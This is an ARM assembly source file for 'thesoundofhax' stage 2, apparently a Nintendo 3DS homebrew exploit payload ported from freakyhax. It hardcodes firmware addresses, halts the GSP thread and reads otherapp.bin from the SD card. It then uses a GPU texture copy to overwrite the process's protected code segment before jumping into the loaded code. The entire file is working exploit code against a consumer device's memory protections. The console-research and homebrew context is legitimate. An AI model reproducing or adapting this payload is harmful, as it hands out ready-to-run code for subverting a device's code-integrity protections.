/* thesoundofhax stage 2 */
/* ported by nedwill from freakyhax (plutoo), with permission */

#define GSP_THREAD_OBJ_PTR  0x003BFFF0
#define FS_OPEN_FILE 0x0022929C
#define OTHERAPP_ADDR 0x142C0000
#define OTHERAPP_SIZE 0xC000
#define FS_READ_FILE 0x002C4204
#define OTHERAPP_CODE_VA 0x00101000
/* OTHERAPP_CODE_VA + 0x27900000 */
#define OTHERAPP_CODE_PA 0x27a01000
#define OTHERAPP_CODE_GPU 0x1ba01000
#define GSP_GET_HANDLE 0x0021C960
#define PARAMBLK_ADDR 0x14000000
#define GSP_GX_CMD4 0x002E9390
#define GSP_FLUSH_DATA_CACHE 0x002E2950
#define GSP_GET_INTERRUPTRECEIVER 0x001C805C
#define GSP_ENQUEUE_CMD 0x001C7BF4
#define GSP_WRITE_HW_REGS 0x002D5810
#define FRAMEBUF_ADDR 0x14200000
#define FRAMEBUF_ADDR_GPU 0x20200000
#define FRAMEBUF_SIZE (400*240*4)
#define FS_MOUNT_SDMC 0x0011FA90

.text
_start:
/* Initialize stack. */
    mov  sp, #0x10000000
    sub  sp, #0x2C
    bl   framebuffer_reset
/* Red screen. */
    ldr  r0, =0xFF0000FF
    bl   framebuffer_fill
/* Tell GSP thread to fuck off. */
    ldr  r0, =GSP_THREAD_OBJ_PTR
    mov  r1, #1
    strb r1, [r0, #0x77]
    ldr  r0, [r0, #0x2C]
    svc  0x18
/* Mount SD card. */
//    adr r0, sdmc_str
//    ldr r1, =FS_MOUNT_SDMC
//    blx r1
/* Open otherapp.bin on sdcard root. */
    add  r0, sp, #0xC     // file_handle_out
    adr  r1, otherapp_str // path
    mov  r2, #1           // flags=FILE_READ
    ldr  r3, =FS_OPEN_FILE
    blx  r3
/* Read it into linear memory. */
    ldr  r1, [sp, #0xC] // file_handle
    add  r0, sp, #8     // bytes_read_out
    mov  r2, #0         // offset_lo
    mov  r3, #0         // offset_hi
    ldr  r4, =OTHERAPP_ADDR
    str  r4, [sp]       // dst
    ldr  r4, =OTHERAPP_SIZE
    str  r4, [sp, #4]   // size
    ldr  r4, =FS_READ_FILE
    blx  r4
//    .word 0xFFFFFFFF // debug crash
/* Gspwn it to code segment. */
    ldr  r0, =OTHERAPP_CODE_GPU // dst
    ldr  r1, =OTHERAPP_ADDR // src
    ldr  r2, =OTHERAPP_SIZE // size
    bl   gsp_gxcmd_texturecopy
    bl   small_sleep
/* Green screen. */
    ldr  r0, =0x00FF00FF
    bl   framebuffer_fill
/* Grab GSP handle for next payload. */
    ldr  r0, =GSP_GET_HANDLE
    blx  r0
    mov  r3, r0
/* Set up param-blk for otherapp payload. */
    ldr  r0, =PARAMBLK_ADDR
    ldr  r1, =GSP_GX_CMD4
    str  r1, [r0, #0x1C] // gx_cmd4
    ldr  r1, =GSP_FLUSH_DATA_CACHE
    str  r1, [r0, #0x20] // flushdcache
    add  r2, r0, #0x48
    mov  r1, #0x8D       // flags
    str  r1, [r2]
    add  r2, r0, #0x58   // gsp_handle
    str  r3, [r2]
/* smea's magic does the rest. */
    ldr  r0, =PARAMBLK_ADDR  // param_blk
    ldr  r1, =0x10000000 - 4 // stack_ptr
    ldr  r2, =OTHERAPP_CODE_VA
    blx  r2
forever:
    b    forever

.pool
otherapp_str:
    .string16 "$sndsd:/otherapp.bin\0"
    .align 4

/* memcpy32: Copy r2 bytes from r1 to r0, 32 bits at a time. */
memcpy32:
    cmp  r2, #0
    bxeq lr
    ldr  r3, [r1], #4
    str  r3, [r0], #4
    sub  r2, #4
    b    memcpy32

/* small_sleep: Sleep for a while. */
small_sleep:
    mov  r0, #0x10000000
    mov  r1, #0
    svc  0x0A // svcSleepThread
    bx   lr

/* gsp_gxcmd_texturecopy: Trigger GPU memcpy. */
gsp_gxcmd_texturecopy:
    push {lr}
    sub  sp, #0x20
    mov  r4, #0

    mov  r5, #4          // cmd_type=TEXTURE_COPY
    str  r5, [sp]
    str  r1, [sp, #4]    // src_ptr=r1
    str  r0, [sp, #8]    // dst_ptr=r0
    str  r2, [sp, #0xC]  // size=r2
    str  r4, [sp, #0x10] // in_dimensions=0
    str  r4, [sp, #0x14] // out_dimensions=0
    mov  r5, #8
    str  r5, [sp, #0x18] // flags=8
    str  r4, [sp, #0x1C] // unused=0

    mov  r0, sp
    bl   gsp_execute_gpu_cmd
    add  sp, #0x20
    pop  {pc}
.pool

gsp_execute_gpu_cmd:
    push {lr}
    mov  r1, r0
    ldr  r4, =GSP_GET_INTERRUPTRECEIVER
    blx  r4
    add  r0, #0x58
    ldr  r4, =GSP_ENQUEUE_CMD
    blx  r4
    pop  {pc}
.pool

/* framebuffer_reset: Setup framebuffer to point to FRAMEBUF_ADDR. */
framebuffer_reset:
    push {lr}
    ldr  r0, =0x00400468
    bl   set_fb_register
    ldr  r0, =0x0040046C
    bl   set_fb_register
    ldr  r0, =0x00400494
    bl   set_fb_register
    ldr  r0, =0x00400498
    bl   set_fb_register

    ldr  r3, =GSP_WRITE_HW_REGS
    ldr  r0, =0x00400470
    adr  r1, __fb_format
    mov  r2, #4
    blx  r3

    ldr  r3, =GSP_WRITE_HW_REGS
    ldr  r0, =0x0040045C
    adr  r1, __fb_size
    mov  r2, #4
    blx  r3

    pop  {pc}
__fb_format:
    .word (0 | (1<<6))
__fb_size:
    .word (240<<16) | (400)

set_fb_register:
    ldr  r3, =GSP_WRITE_HW_REGS
    adr  r1, __fb_physaddr
    mov  r2, #4
    bx   r3
__fb_physaddr:
    .word FRAMEBUF_ADDR_GPU

/* framebuffer_fill: Fill framebuffer with color in r0. */
framebuffer_fill:
    ldr   r1, =FRAMEBUF_ADDR
    ldr   r2, =FRAMEBUF_SIZE
    add   r2, r1
__fill_loop:
    str   r0, [r1]
    add   r1, #4
    cmp   r1, r2
    bne   __fill_loop
    ldr   r4, =GSP_FLUSH_DATA_CACHE
    ldr   r0, =FRAMEBUF_ADDR
    ldr   r1, =FRAMEBUF_SIZE
    bx    r4

.pool

/* Force assembler error if payload becomes greater than 0x800. */
.org 0x300, 0x45
